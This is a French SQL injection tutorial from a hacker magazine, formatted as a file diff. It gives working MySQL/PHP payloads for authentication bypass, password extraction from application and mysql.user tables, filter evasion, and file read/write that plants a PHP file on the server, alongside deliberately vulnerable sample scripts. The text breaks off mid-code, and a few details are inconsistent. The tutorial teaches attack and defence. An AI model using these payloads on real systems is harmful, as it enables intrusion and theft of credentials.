@@ -1,0 +1,1189 @@
+
+
+Tutoriel écrit par NiklosKoda, extrait du HZV Mag #2 disponible sur le site de HZV (HackerZVoice).
+Tour d'horizon sur les SQL Injections
+
+Le Structured Query Language, ou langage structuré de requêtes, est un pseudo-langage informatique standardisé, destiné à interroger ou à manipuler une base de données relationnelle (Wikipedia). Mais aujourd'hui avec le développement de site web dynamiques, il est courant de voir les applications web utiliser une base de donnée. De ce fait, elles manient des requêtes SQL qui, par un jeu de variable mal sécurisées, permettent l'injection de requêtes SQL détournées.
+
+Dans cet article j'essayerai donc de couvrir au mieux le large domaine des injections SQL, en me focalisant sur les injections utilisant MySQL et PHP. Mais au vu de l'évolution des techniques et des logiciels, un tel article ne reste jamais bien complet. Enfin, ce dernier se veut ouvert à tous et c'est pourquoi il présentera aussi bien les techniques basiques que des méthodes d'attaque plus poussées.
+Table des matières
+
+    1 - Fonctions, expressions et informations utiles
+        1.1 - Contournement de condition
+        1.2 - Structure de requête
+        1.3 - BDD informations
+        1.4 - Manipulation de Chaînes
+            1.4.a - La notation hexadécimale
+            1.4.b - La fonction CHAR
+            1.4.c - La fonction CONV
+    5 - Manipulation de fichiers
+    2 Trois types d'injections
+        2.1 Affichage des résultats
+        2.2 Blind
+        2.3 Total Blind
+    3 Autres vecteurs d'Injection
+        3.1 Requêtes imbriquées
+        3.2 Autre que SELECT
+        3.3 Injections basées sur une erreur
+        3.4 SQL column truncation
+        3.5 Charset & contournement de l'échappement
+        3.6 DoS MySQL
+    4 Sécurisation
+
+1 - Fonctions, expressions et informations utiles pour l'injection SQL
+
+Dans cette première partie, je ne ferais que présenter / rappeler des bases d'injections, des exemples classiques, des fonctions et informations utiles pour manipuler les données. Je conseille ainsi à ceux qui sont déjà quelques peu familiarisés avec les injections SQL de survoler cette partie et de passer
+Définition des outils
+
+Voici quelques liens vers la documentation MySQL, pour les différents outils que nous allons utiliser ici.
+SELECT (contient également UNION, ORDER BY, GROUP BY et INTO OUTFILE)
+
+http://dev.mysql.com/doc/refman/5.0/fr/select.html
+Les opérateurs logiques
+
+http://dev.mysql.com/doc/refman/5.0/fr/logical-operators.html
+Les chaines de caractères et les nombres
+
+http://dev.mysql.com/doc/refman/5.0/fr/literals.html
+Les fonctions d'informations
+
+http://dev.mysql.com/doc/refman/5.0/fr/information-functions.html
+Les fonctions sur les chaines de caractères
+
+http://dev.mysql.com/doc/refman/5.0/fr/string-functions.html
+LOAD DATA INFILE
+
+http://dev.mysql.com/doc/refman/5.0/fr/loaddata.html
+Les tables d'information_schema
+
+Bien entendu cette liste est non exhaustive.
+1.1 - Contournement de condition
+
+L'injection SQL probablement la plus basique revient à contourner une condition, c'est à dire de fixer sa valeur quel que soit l'état des paramètres qu'elle prend en compte. On pourra par exemple contourner un filtre de bannissement en rendant fausse une condition, ou encore contourner une authentification avec n'importe quel mot de passe en la rendant vraie.
+
+Une condition se présente sous la forme suivante, une ou plusieurs assertions vraies ou fausses, rassemblées à l'aide de mot-clés logiques comme AND ou OR :
+
+... WHERE (assertion1 OR assertion2) AND assertion3
+... HAVING NOT assertion
+
+Voilà quelques exemples de codes SQL à placer après une condition pour la rendre vraie :
+
+... OR true
+... OR 1=1
+... OR 'a'='a' :
+
+Et de la même manière, pour la rendre fausse :
+
+... AND false
+... AND 1=2
+... AND 'a'>'b'
+
+On l'a bien compris, la syntaxe générale la plus courante pour bypasser une condition sera "OR assertion_vraie" ou "AND assertion_ false" selon le résultat souhaité. Voici maintenant deux illustrations de ce type d'injection :
+
+La première est une authentification qui requiert un mot de passe, et la seconde est un script qui vérifie si l'utilisateur est banni.
+
+<?php
+
+$sql = mysql_query("SELECT id,nom,email,droits FROM utilisateurs WHERE password='" . $_GET['password']. "'");
+
+if(mysql_num_rows($sql) != 1)
+	echo 'Erreur';
+else
+{
+	$data = mysql_fetch_array($sql);
+	echo 'Bienvenue '.$data['nom'];
+}
+
+# 2
+
+$sql = mysql_query("SELECT id FROM bannis WHERE ip='" . getIp() . "'");
+
+if(mysql_num_rows($sql)>0)
+	echo 'Vous êtes banni !';
+else
+	echo 'Bienvenue';
+	
+function getIp()
+{
+return isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'] ;
+}
+?>
+
+Pour le premier, il suffira d'accéder au fichier comme ceci : fichier.php?password=' OR 'a'='a Pour le second par contre, il faudra envoyer un header HTTP nommé X-Forwarded-For dont la valeur sera ' AND 'a'='b.
+1.2 - Structure de requête
+
+Afin d'exploiter au maximum la requête où nous effectuons notre injection, il est utile d'en connaître les différentes coutures : principalement le nombre et les noms des champs et tables utilisés. Lors d'un audit open-source cela ne pose pas de difficultés, mais lorsque ce n'est pas le cas nous devons trouver un moyen d'obtenir des informations sur la requête par nous même.
+
+Commençons par le nombre de champs. Nous allons utiliser les clauses ORDER BY ou GROUP BY, qui permettent respectivement d'ordonner ou de regrouper les résultats retournés selon un critère précis. Ce critère est généralement le nom d'un champ d'une des tables que l'on interroge. Ainsi pour ordonner une liste de nom par nom de famille, puis par prénom dans l'ordre alphabétique on pourra faire SELECT nom,prenom FROM population ORDER BY nom,prenom ASC. Mais le critère de tri (ou de regroupement si on utilise GROUP BY) peut aussi être un numéro, numéro qui est en fait l'index du champ selon lequel on veut ordonner les résultats. Ainsi la requête précédente pourrait se réécrire SELECT nom,prenom FROM population ORDER BY 1,2 ASC, où 1 désigne le champ nom et 2 le champ prenom. On peut donc déterminer le nombre de champ d'une requête en utilisant l'injection suivante, et en guettant une erreur SQL : ORDER BY i, où i est un nombre.
+
+Si la requête contient au moins i champs, alors elle s'exécutera normalement et ordonnera les résultats selon les valeurs du ième champ, mais si elle en contient moins, alors elle renverra une erreur Unknown column 'i' in 'order clause'. En procédant de proche en proche, on connaîtra donc le nombre de champ de la requête dès qu'on obtient cette erreur, il suffira de retrancher 1 à la valeur courante de i. Un autre moyen de déterminer le nombre de champ dans une requête aurait été d'employer UNION. Cet opérateur permet de joindre les résultats de plusieurs requêtes, mais pour cela il faut, entre autres, que les requêtes aient le même nombre de champs. La syntaxe de UNION est la suivante :
+
+SELECT champ1, champ2, champ3
+FROM table1 UNION SELECT autre1,autre2, autre3 FROM table2
+
+Si les différentes requêtes jointes par un UNION n'ont pas le même nombre de champ alors MySQL retournera l'erreur The used SELECT statements have a different number of column. Ainsi, en procédant de manière incrémentale comme précédemment on connaîtra le nombre de champs, mais cette fois ci dès que l'on n'obtient plus une erreur mais que la requête s'exécute correctement. L'injection à réaliser est la suivante :
+
+... UNION SELECT 1
+... UNION SELECT 1,1
+... UNION SELECT 1,1,1
+
+Maintenant, en ce qui concerne les noms des champs et des tables, la seule solution est le brute force (ou le test des "noms probables")... Il faut tester les noms comme ceci par exemple pour les champs :
+
+... ORDER BY nom_du_champ
+... GROUP BY nom_du_champ
+
+Et comme cela pour les tables :
+
+... UNION SELECT 1,2,3 FROM nom_de_la_table
+
+On obtiendra ces erreurs si le champ ou la table n'existe pas : Unknown column 'nom_ du_champ' in 'order clause' et Table 'nom_ de_la_base.nom_de_la_table' doesn't exist. Au passage on remarque que l'on a trouvé un premier moyen d'obtenir le nom de la base utilisée ;)
+
+Il existe en réalité un autre moyen d'obtenir la structure des bases et tables mysql (pour les versions >=5), c'est d'interroger la base d'informations information_schema, mais nous verrons cela dans un futur paragraphe.
+
+Reste maintenant à déterminer le type des champs, car même si le nom est généralement assez explicite, il peut rester une ambiguïté (par exemple un champ id peut être un numéro d'identification comme 42, ou une chaîne comme "4e694b6c3073").
+
+Malheureusement il n'existe pas de fonction SQL comme TYPEOF() ou GETTYPE() qui retournerait précisément le type du champ (int, bigint, varchar, text, date,...) mais on peut tout de même déterminer s'il s'agit d'une chaîne de caractère ou d'un nombre en utilisant la fonction CHARSET (comme pour les noms, information_ schema nous sera bien utile pour les types aussi, mais nous verrons cela plus tard).
+
+Cette fonction retourne le jeu de caractère de la chaîne passé en argument, ainsi en faisant SELECT CHARSET(champ) on obtiendra des informations sur les valeurs stockées dans le champ, donc sur le champ lui même. Pour tous les types numériques, ainsi que les types "de temps" (date, year, ...) cette fonction retournera binary et pour les chaînes de caractères elles retournera le nom du charset (latin1, latin2, utf8, ascii, big5,...). On pourra donc tester les injections suivantes pour savoir a peu près à quel type on a affaire :
+
+... AND CHARSET(nom_du_champ) = 'binary'
+... AND CHARSET(nom_du_champ) = 'latin1'
+... AND CHARSET(nom_du_champ) IN ('latin1', 'utf8', 'big5', ...)
+... AND CHARSET(nom_du_champ) = CHARSET(123)
+... AND CHARSET(nom_du_champ) = CHARSET('chaine')
+
+Nous voilà donc en possession d'assez d'informations sur la requête où nous souhaitons effectuer notre injection, passons à la suite où nous verrons comment récupérer des informations sur l'environnement MySQL.
+1.3 - BDD informations
+
+Il existe plusieurs types de variables MySQL : les variables définies par l'utilisateur (qui s'écrivent @nom) et les variables système (qui s'écrivent @@nom). Elle sont utilisables dans quasiment toutes les requêtes et peuvent contenir des informations intéressantes sur la base de données, sur MySQL et ou encore sur la machine où est installé MySQL. On peut lister les variables système disponibles avec la commande : SHOW VARIABLES, voici les plus intéressantes :
+
+    @@basedir : le dossier d'installation de MySQL ;
+    @@character_set_X : le jeu de caractères utilisé par X (X pouvant être client, système, server, ...) ;
+    @@datadir : le dossier ou sont stoquées les données de MySQL (un sous dossier portant le nom de la base y est crée pour chaque base) ;
+    @@init_file : l'emplacement du fichier d'initialisation contenant les requêtes exécutées au démarrage de MySQL ;
+    @@local_infile : permet de savoir si LOCAL est supporté avec LOAD DATA INFILE ;
+    @@log_error : le fichier de logs des erreurs de MySQL ;
+    @@max_xxx : les valeurs de configuration maximales de MySQL, en les dépassant on peut empêcher son bon fonctionnement (par exemple bloquer MySQL en dépassant @@ max_connections, ou empêcher l'exécution d'une requête en dépassant @@max_allowed_ packet, ...) ;
+    @@port : le port sur lequel MySQL écoute ;
+    @@timestamp et @@timezone : permet d'obtenir l'heure sur la machine distante ;
+    @@version : la version de MySQL ;
+    @@version_compile_os : permet d'obtenir une info sur le type d'os sur lequel est installé MySQL (par exemple cette variable peut valoir pc-linux, Win32, ...).
+
+Ces variables sont donc une grande source d'informations, tout comme « les fonctions d'information » dont voici les plus intéressantes :
+
+    DATABASE() : retourne le nom de la base courante ;
+    USER() : renvoie le nom d'utilisateur et le nom d'hôte courant (exemple : root@localhost) ;
+    VERSION() : renvoie la version de MySQL. Nos injections pourront donc faire intervenir ces différents éléments, voici quelques exemples :
+
+... UNION SELECT @@version
+... AND VERSION() > '5.1'
+... AND USER() LIKE 'root%'
+
+C'était le premier volet de cette partie expliquant comment obtenir des informations, voyons maintenant une autre source d'informations de MySQL.
+BDD informations : information_schema et mysql
+
+Il existe dans MySQL une base nommée information_ schema qui réunit des informations sur la structure des bases et des tables, sur les utilisateurs, etc... L'intérêt de cette base est qu'elle est accessible en lecture à tous les utilisateurs, donc on pourra, connaissant sa structure, l'interroger pour récupérer des informations cruciales dans le cas d'une attaque. Voici les tables et les champs les plus intéressants :
+
+    SCHEMATA.SCHEMA_NAME contient le nom des différentes bases ;
+    TABLES.TABLE_NAME contient le nom des différentes tables ;
+    COLUMNS.COLUMN_NAME contient le nom des différents champs ;
+    COLUMNS.COLUMN_TYPE contient le type de données du champ correspondant (il est plus précis que DATA_TYPE car on a également la taille) ;
+    USERS_PRIVILEGES.IS_GRANTABLE permet de savoir si l'utilisateur enregistré dans USER_PRIVILEGES.GRANTEE à le privilège désigné par USER_PRIVILEGES.PRIVILEGE_ TYPE.
+
+On pourrait donc imaginer les injections suivantes pour exploiter les données fournies par information_schema :
+
+... UNION SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=DATABASE()
+... UNION SELECT PRIVILEGE_TYPE, IS_GRANTABLE FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=USER()
+... UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE COLUMN_NAME LIKE '%pass%' AND DATA_TYPE='varchar' AND 
+  TABLE_SCHEMA=DATABASE()
+
+Dans un exemple à venir nous construirons un script qui nous permettra de récupérer la structure bases/tables à partir d'une injection SQL.
+
+Il existe une seconde base intéressante dans MySQL, elle se nomme tout simplement mysql et contient plusieurs tables d'informations, dont celle qui nous intéressera le plus : la table user. Cette table contient notamment : les identifiants (login et pass) de tous les utilisateurs et les hôtes à partir desquels ils sont autorisés à se connecter (ainsi que leurs privilèges mais nous pouvons déjà les obtenir à partir d'information_ schema). Seul problème, les tables de cette base ne sont accessibles qu'au super-utilisateur (souvent « root »), donc nous ne pourrons effectuer une injection SQL vers celle ci uniquement si la connexion MySQL s'est fait avec ce dernier. Voilà un exemple :
+
+... UNION SELECT Password FROM mysql.user WHERE User = 'root'
+... UNION SELECT Password FROM mysql.user WHERE Host = '%'
+
+A noter que les mots de passe des utilisateurs MySQL sont cryptés avec l'algorithme utilisé par la fonction PASSWORD().
+1.4 - Manipulation de chaînes, Encodage et Conversion
+
+Penchons nous maintenant sur un problème récurrent dans le domaine des injections SQL : celui de la détection, ou de l'échappement de certains caractères spéciaux. Par exemple, la directive (prochainement supprimée) magic_quotes_gpc de PHP échappe entre autres les quotes, simples et double, donc la moindre injection utilisant une quote sera faussée et échouera... Nous allons donc voir ici différentes astuces, conversions, encodages afin de tenter de contourner ces pseudos moyens de sécurisation.
+
+1.4.a - La notation hexadécimale
+
+Par défaut MySQL considère les données sous formes hexadécimale (c'est à dire formatées comme ceci : 0x53716c496e6a656374) comme des chaînes de caractères. Ainsi SELECT 0x61626364 renverra abcd. (les données hexadécimales sont par contre considérées comme des nombres si elles sont utilisées dans un contexte numérique, comme : SELECT 0x61 + 0x62, qui renverra 195.). L'avantage de cette notation est celui que nous recherchons : il n'utilise aucun caractère spécial. Ainsi on pourra supprimer totalement les quotes de nos injections, les deux injections suivantes sont en effet équivalentes :
+
+... AND password = 'azerty'
+... AND password = 0x617a65727479
+
+Voici une fonction PHP permettant de convertir une chaîne en hexadécimal :
+
+function stringtohex($string)
+{
+$hex = '';
+for($i=0 ; $i<strlen($string) ; $i++)
+$hex .= base_convert(ord(substr($string, $i, 1)), 10, 16);
+return '0x'.$hex;
+}
+
+1.4.b - La fonction CHAR
+
+Voici un autre moyen de convertir une chaîne : utiliser la fonction CHAR qui retourne une chaîne de caractères construite à partir des codes ascii passés en argument. Ainsi, pour reprendre le précédent exemple :
+
+... AND password = 'azerty'
+... AND password = CHAR(97,122,101,114,116,121)
+
+Et voici une autre fonction PHP pour convertir des chaînes à ce format :
+
+function mysql_stringtochar($string)
+{
+$char = 'CHAR(';
+for($i=0 ; $i<strlen($string)-1 ; $i++)
+$char .= ord(substr($string, $i, 1)).',';
+$char .= ord(substr($string, strlen($string)-1, 1)).')';
+return $char;
+}
+
+1.4.c - La fonction CONV
+
+Jusqu'à présent nous avons encodé les données que nous injections pour les comparer aux données stockées, avec la fonction CONV nous allons considérer les données stockées (des chaînes de caractères donc) comme des chiffres et ainsi nous n'aurons plus besoins d'encoder les données injectées : nous fournirons des chiffres directement. CONV sert à convertir des chiffres d'une base à une autre. Les bases les plus courantes sont la base 2 (binaire), 10 (décimale) et 16 (hexadécimale), mais on peut bien sur étendre cela à n'importe quoi entre 2 et 36. Ici c'est la conversion base 36 / base 10 qui nous intéresse : en effet les chiffres de la base 36 sont les 10 caractères numériques habituels (de 0 à 9) et les 26 caractères alphabétiques (de a à z). Ainsi toute chaine alphanumérique est potentiellement un nombre en base 36, et de ce fait nous pouvons la convertir dans une base pour laquelle nous n'utiliserons que des chiffres classiques, ne nécessitant pas l'utilisation de quotes. Toujours en reprenant le même exemple :
+
+... AND password = 'azerty'
+... AND CONV(password, 36, 10) = 664137574
+
+Où 664137574 est la conversion en base 10 du nombre azerty en base 36. Le problème de cette méthode est que CONV fonctionne avec une précision de 64 bits, donc pour les chiffres de grandes tailles (ou plutôt les longues chaînes) on aura une imprécision : toute une plage de valeur sera acceptée alors qu'une seule valeur devrait l'être. Pour y remédier, voici des idées de solutions. La première est de déterminer le début de la chaîne par la méthode que l'on vient de voir, puis de déterminer la fin, en renversant la chaîne comme ceci :
+
+... AND CONV(REVERSE(password), 36, 10) = xxxxxx
+
+L'imprécision est alors reportée sur la fin de la nouvelle chaîne (à savoir le début de la chaîne non renversée) que nous connaissons déjà.
+
+Une autre solution peut être de scinder la chaîne en plusieurs petites chaînes, et de déterminer la chaine partie par partie : Où SUBSTR(X, a, b) permet d'extraire la sous-chaîne de la chaîne X commençant à l'index a et ayant une longueur de b.
+
+Ces deux derniers exemples font intervenir un aspect incontournable des injections SQL : la manipulation de chaînes des caractères. Et il n'est pas rare d'utiliser une ou plusieurs fonctions de manipulation des chaînes pour mener à terme une injection. Nous avons déjà montré l'utilité de REVERSE, qui permet de retourner une chaîne, et de SUBSTR, qui permet (comme LEFT,RIGHT et MID) d'extraire une sous chaîne d'une chaîne donnée, voyons maintenant d'autres exemples. CONCAT permet de concaténer plusieurs chaînes, et peut être pratique dans le cas d'une requête ou on ne peut sélectionner qu'un seul champ :
+
+... UNION SELECT CONCAT(login,':',password) FROM membres WHERE id=1
+
+Sa grande soeur, GROUP_CONCAT est également très utile : elle permet de concaténer en un seul résultat, les valeurs qui normalement seraient renvoyés sur plusieurs résultats, par exemple, si nous faisons :
+
+... UNION SELECT CONCAT(login,':',password) FROM membres
+
+Le seul résultat retourné sera une chaîne contenant les identifiants de tous les membres, construite comme ceci : login:pass,admin:plop,foo: bar...
+
+On retiendra aussi les fonctions LENGTH, CHAR_LENGTH et BIT_ LENGTH qui nous permettront de connaître la longueur d'une chaîne de caractère :
+
+HEX et UNHEX qui permettent d'effectuer les conversions chaîne/ hexadécimal, peuvent être aussi très utiles, par exemple en faisant un double HEX sur une chaîne, il ne nous reste que des nombres, plus aucuns caractères alphabétiques :
+
+... AND password = 'azerty'
+... AND HEX(HEX(password)) = 363137413635373237343739
+
+HEX peut également accepter un chiffre comme argument, mais UNHEX lui renvoi toujours une chaîne de caractères. Donc UNHEX(HEX(97)), renvoie le caractère ayant 97 pour code ASCII. Exemple :
+
+... AND password = 'azerty'
+... AND HEX(HEX(password)) = CONCAT(UNHEX(HEX(97)), UNHEX(HEX(101)), UNHEX(HEX(114)), UNHEX(HEX(116)), UNHEX(HEX(121)))
+
+On dispose également des fonctions ASCII et ORD qui permettent de renvoyer le code ASCII d'un caractère (ou du premier caractère d'une chaîne).
+
+... AND ASCII(SUBSTR(password, 1, 1)) = 97
+
+Il est également des cas où MySQL renverra l'erreur Illegal mix of collations, notamment lorsque des champs joint avec UNION contiennent des chaînes de caractères qui n'utilisent pas le même charset. Pour y remédier nous pourrons faire UNHEX(HEX(str)) qui renverra une chaîne utilisant le charset utilisé par MySQL et plus généralement, pour choisir nous même le charset utilisé : CONVERT(str USING charset). Toujours pour tester la valeur d'une chaîne, on pourra utiliser l'opérateur LIKE, qui permet de dire si une chaîne correspond à un masque, qui peut être construit avec deux caractères joker : % qui remplace une suite de caractères et _ qui n'en remplace qu'un. Par exemple, on pourra déterminer un champ lettre par lettre comme ceci :
+
+... AND password LIKE 'a%'
+... AND password LIKE 'az%'
+... AND password LIKE 'aze%'
+
+Et ainsi de suite jusqu'à trouver la valeur exacte. On pourra utiliser les différentes conversions pour s'affranchir des quotes, et le mot clé BINARY pour que la comparaison soit sensible à la casse.
+
+Etc, etc... Les manipulations de chaînes sont donc courantes et très utiles pour les injections SQL.
+
+Enfin, pour terminer ce paragraphe, voyons quelques astuces qui peuvent s'avérer utiles, utilisant les commentaires. Si jamais la fin d'une requête est gênante, on peut la commenter de trois manières : #, --, ou /* */ (le dernier pouvant commenter plusieurs lignes).
+
+Il existe d'ailleurs un moyen de déterminer la version de MySQL en utilisant une syntaxe de commentaire un peu particulière : /*!VERSION CODE*/. En effet comme ceci CODE ne sera exécuté que si la version est supérieure ou égale à VERSION, où VERSION est une suite de 5 chiffres, par exemple la requête suivante ne s'exécutera que si la version de MySQL est au moins 5.1.30 :
+
+... /*!50130 UNION SELECT pseudo,password FROM membres*/
+
+Les espaces (au cas ou il seraient filtrés) peuvent aussi être remplacés par des commentaires « ouverts-fermés » /**/ :
+
+... AND password = 'azerty'
+... AND/**/password/**/=/**/'azerty'
+
+Et au cas où certains mots seraient filtrés on peut tout à fait les « couper » en utilisant la même méthode, par exemple si les mot clés UNION et SELECT sont filtrés :
+
+... UN/**/ION S/**/ELECT ...
+
+1.5 - Manipulation des fichiers
+
+Parlons ici des injections SQL utilisant les fichiers. MySQL nous propose en effet quelques fonctionnalités permettant d'utiliser des fichiers, à savoir LOAD DATA INFILE, LOAD_FILE et INTO OUTFILE/DUMPFILE.
+
+Bien que très intéressant, ce type de faille reste plutôt rare, principalement à cause du fait que l'utilisateur MySQL doit avoir le privilège FILE de MySQL pour pouvoir manipuler les fichiers, et que ce dernier est distribué au compte-goutte par des administrateurs un tant soit peu consciencieux.
+
+Il est bon de préciser également que, pour toutes les opérations sur les fichiers que nous verrons :
+
+Nous ne pourrons accéder qu'au fichiers auquel le serveur MySQL a accès.
+
+Nous ne pourrons pas réécrire de fichiers déjà existants, ce qui empêche l'écrasement de fichiers importants.
+
+Nous devrons fournir le chemin complet du fichier sur le serveur, et non pas le chemin relatif.
+
+Parlons premièrement de LOAD DATA INFILE. C'est celui, je pense, que nous utiliserons le moins, car il n'est pas possible de l'utiliser dans une
+
+requête détournée : il a besoin d'une requête à part entière. Il permet, comme son nom l'indique, de charger le contenu d'un fichier dans une table, et s'utilise par exemple comme suit : LOAD DATA INFILE 'path/ to/file' INTO TABLE table. On pourrait donc imaginer un script de backup de fichiers, qui ferait :
+
+LOAD DATA INFILE '/www/site/index.php' INTO TABLE backup
+
+Mais, dans le cadre d'une attaque, on pourrait aussi imaginer effectuer l'enregistrement de fichiers sensibles comme :
+
+LOAD DATA INFILE '/www/site/admin/.htaccess' INTO TABLE membres
+
+A noter que cette requête ne fait qu'enregistrer le fichier dans la table membre, l'affichage lui sera fait par un script du type "liste des membres". Voici maintenant la particularité de LOAD DATA INFILE. On peut lire dans la documentation MySQL :
+
+Si LOCAL est spécifié, le fichier est lu par le programme client, et envoyé vers l'hôte. Si LOCAL n'est pas spécifiée, le fichier doit être sur le serveur hôte, et sera lu directement par le serveur. [...] Utiliser LOCAL est plus lent que de laisser le serveur accéder directement aux fichiers, car le contenu du fichier doit être envoyé via le réseau au serveur. D'un autre coté, vous n'aurez pas besoin de droits de FILE pour faire un chargement local.
+
+Ce qui signifie clairement, qu'en reprenant les requêtes précédentes, mais en écrivant cette fois ci LOAD DATA LOCAL INFILE nous serons en mesure de récupérer le contenu de fichiers sans le privilège FILE, ce qui constitue une faiblesse énorme.
+
+Passons maintenant à INTO OUTFILE : il permet d'écrire le résultat d'une requête dans un fichier, et s'utilise comme ceci :
+
+SELECT ... INTO OUTFILE '/path/to/file'
+
+A noter qu'on peut également utiliser INTO DUMFILE, à la différence qu'avec ce dernier MySQL n'écrira qu'une seule ligne dans le fichier de destination, on préférera donc ici utiliser INTO OUTFILE.
+
+Une injection SQL utilisant INTO OUTFILE nous permettra donc de récupérer le contenu d'une table dans un fichier. et serra donc de la forme :
+
+... UNION SELECT login, pass FROM admin INTO OUTFILE '/www/site/file.txt'
+
+Et on pourra également créer des fichiers qui seront interprétés par le serveur en choisissant leur extension, par exemple des fichiers PHP :
+
+... UNION SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/www/site/evil.php'
+
+Enfin, voyons la fonction LOAD_FILE, qui lit un fichier et retourne son contenu sous forme d'une chaîne de caractères. On l'utilise par exemple comme ceci : SELECT LOAD_FILE('/www/site/user'). Les injections SQL classiques, avec cette fonction consisteront à récupérer le contenu non visible (par exemple des fichiers PHP) et à l'exporter dans un nouveau fichier qui lui sera visible, en utilisant INTO OUTFILE :
+
+... UNION SELECT LOAD_FILE('/www/site/index.php') INTO OUTFILE '/www/site/source.txt'
+
+Nous verrons aussi un exemple d'injection SQL à l'aveugle utilisant LOAD_FILE dans la partie II de cet article.
+
+Enfin, avant de clore cette première partie, notons que ces différentes opérations sur les fichiers vont également nous permettre de déterminer si un fichier existe ou non sur le serveur. En effet, LOAD DATA INFILE a besoin d'un chemin de fichier valide, sinon la requête générera l'erreur File '/www/site/fake.txt' not found. Et de même, INTO OUTFILE n'écrira un fichier que si ce dernier n'existe pas déjà, auquel cas on obtiendra l'erreur File '/www/site/admin/.htpasswd' already exists. On pourra donc utiliser ces erreurs pour vérifier la présence d'un fichier. LOAD_FILE pourra également nous permettre de vérifier si un fichier existe (et également si nous avons le privilège FILE) en testant que la valeur de retour n'est pas nulle.
+
+Ceci termine cette première partie. Nous allons maintenant nous focaliser sur l'utilisation de tous ces différents outils dans des cas plus concrets.
+2 - Trois types d'injections
+
+Maintenant que nous avons assimilé des informations sur les injections SQL voyons comment les mettre en pratique. Pour cela nous verrons, à travers des exemples, 3 types différents d'injection SQL.
+
+2.1 - Affichage des résultats
+
+Le premier type d'injection SQL que nous allons voir est probablement le « plus simple », celui qui demande le moins de temps et de ressources. En effet, nous nous plaçons ici dans le cas où les résultats de la requête cible sont affichés clairement (enfin, ils peuvent aussi être enregistrés dans un fichier, ou autre, l'important est que nous y ayons accès). Ce cas est le plus favorable car nous pourrons récupérer directement et sans opérations supplémentaires toutes les informations que nous avons vues précédemment.
+
+L'exploitation la plus classique consiste à utiliser l'opérateur UNION qui permet de rassembler les résultats de plusieurs requêtes SELECT. Voyons tout de suite un exemple simple : une page profil.php dont voici le code source :
+
+<?php
+$id = intval($_GET['id']) ? $_GET['id'] : FALSE;
+
+if($id === FALSE)
+	echo 'Id incorrecte.';
+else
+{
+	$db = mysql_connect('localhost', 'root', '') or die('Erreur de connection');
+	mysql_select_db('MaBase', $db) or die('Erreur de selection');
+	
+	if(($sql = mysql_query("SELECT * FROM membres WHERE id=".$id)) === FALSE)
+		echo 'Erreur SQL';
+	else
+	if(mysql_num_rows($sql) != 1)
+		echo 'Ce membre n\'existe pas.';
+	else
+	{
+		$data = mysql_fetch_array($sql);
+		echo 'Le membre ayant l\'id '.$data['id'].' est '.$data['pseudo'].' est s\'est connecté pour la dernière
+ 		fois le '.$data['date'].'.';
+	}
+}
+?>
+
+Et voilà également la structure et les données de la table membres :
+
+CREATE TABLE `MaBase`.`membres`
+(
+	`id` INT NOT NULL AUTO_INCREMENT,
+	`pseudo` VARCHAR( 20 ) NOT NULL,
+	`password` VARCHAR( 20 ) NOT NULL,
+	`date` DATE NOT NULL,
+	PRIMARY KEY ( `id` )
+);
+
+INSERT INTO `MaBase`.`membres` (`id`, `pseudo`, `password`, `date`)
+VALUES
+	(NULL, 'Admin', '@azerty12345@', '2009-02-27'),
+	(NULL, 'JeanEdouard', 'MamanJtm', '2009-02-18');
+
+Passons maintenant à l'exploitation : ici la variable $id est faillible puisqu'elle n'est pas correctement sécurisée. En effet, cela est du à une mauvaise utilisation de la fonction intval, qui renvoie juste « un équivalent numérique » de la variable passée en paramètre, mais ne permet pas de vérifier si la variable est effectivement numérique...
+
+Nous allons utiliser UNION, il faut donc commencer par déterminer le nombre de champs :
+
+profil.php?id=1 UNION SELECT 1
+profil.php?id=1 UNION SELECT 1,2
+profil.php?id=1 UNION SELECT 1,2,3
+profil.php?id=1 UNION SELECT 1,2,3,4
+
+Parmi ces quatre injections, les trois premières nous donnent « Erreur SQL », ce qui signifie que notre requête n'a pas été exécutée correctement. Par contre la dernière renvoie « Ce membre n'existe pas. », ce qui nous informe que la requête s'est terminée avec succès, mais qu'elle renvoie trop de résultats, et le script s'arrête là car il n'en attend qu'un seul. Nous savons donc maintenant que le premier SELECT (et la table membres) utilise 4 champs. Maintenant, nous voulons que le seul résultat retourné soit celui obtenu via notre injection, pour cela nous pouvons utiliser la clause LIMIT (qui permet de sélectionner le nombre de résultats), ou une $id inexistante :
+
+profil.php?id=1 UNION SELECT 1,2,3,4 LIMIT 1,1
+profil.php?id=12345 UNION SELECT 1,2,3,4
+
+Ces deux méthodes donnent :
+Le membre ayant l'id 1 est 2 est s'est connecté pour la dernière fois le 4
+
+Il ne nous reste plus qu'à demander les informations voulues (pass des membres, informations sur la BDD, ...), en évitant d'utiliser le troisième champ car on remarque qu'il n'est pas affiché.
+
+profil.php?id=99 UNION SELECT pseudo,password,NULL,NULL
+FROM membres WHERE id=1
+profil.php?id=99 UNION SELECT pseudo,password,NULL,NULL
+FROM membres WHERE id=2
+profil.php?id=99 UNION SELECT @@
+version,USER(),NULL,DATABASE()
+
+Les résultats de ces injections sont respectivement (le dernier peut varier) :
+
+Le membre ayant l'id Admin est @azerty12345@ est s'est connecté pour la dernière fois le .
+
+Le membre ayant l'id JeanEdouard est MamanJtm est s'est connecté pour la dernière fois le .
+
+Le membre ayant l'id 5.1.30-community-log est root@localhost est s'est connecté pour la dernière fois le MaBase.
+
+Ce type d'injection est donc relativement simple.
+
+2.2 - Blind
+
+Les injections de type « Blind » (ou injection « à l'aveugle » en français) sont celles pour lesquelles nous ne pouvons pas visualiser les résultats de la requête, mais où nous avons tout de même un élément d'information booléen sur le résultat de la requête : c'est à dire que nous savons si elle renvoie quelque chose ou non, si elle renvoie Vrai ou Faux. Cette information peut se présenter de plusieurs façons, l'affichage d'un profil ou d'un message d'erreur, la redirection vers une administration ou vers une zone membre, ...
+
+Ainsi, nous devrons nous contenter de manipuler les données et de tester leur valeur de différentes manières afin de les déterminer, mais sans pouvoir les afficher directement.
+
+Ainsi, voyons un exemple : le script login.php vérifie un couple d'identifiants, et redirige l'utilisateur vers la page membre.php s'il est correct, ou vers la page « erreur.php » s'il ne l'est pas. Voici la source :
+
+<?php
+if(!isset($_POST['pseudo'], $_POST['pass']) || empty($_POST['pseudo']) || empty($_POST['pass']))
+	header('Location: erreur.php');
+else
+{
